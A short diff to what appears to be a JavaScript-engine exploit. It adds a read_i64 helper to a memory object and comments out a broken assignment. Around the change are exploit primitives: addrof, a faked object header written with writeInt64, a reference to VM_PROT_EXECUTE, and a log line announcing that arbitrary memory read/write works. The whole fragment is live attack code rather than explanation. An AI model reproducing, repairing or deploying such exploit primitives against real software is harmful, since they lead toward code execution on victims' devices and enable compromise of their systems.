@@ -612,6 +612,9 @@ var VM_PROT_EXECUTE = 0x4
 
             return a
         },
+        read_i64: function(addr) {
+            return this.read64(addr);
+        },
     };
 
     // Testing code, not related to exploit
@@ -619,7 +622,7 @@ var VM_PROT_EXECUTE = 0x4
     var header = memory.read64(addrof(plainObj));
     memory.writeInt64(memory.addrof(container), header);
     //memory.test();
-    let memory.read_i64 = memory.read64;
+    //let memory.read_i64 = memory.read64;
      
     print("[+] arbitrary memory read/write working");
         var log = print;
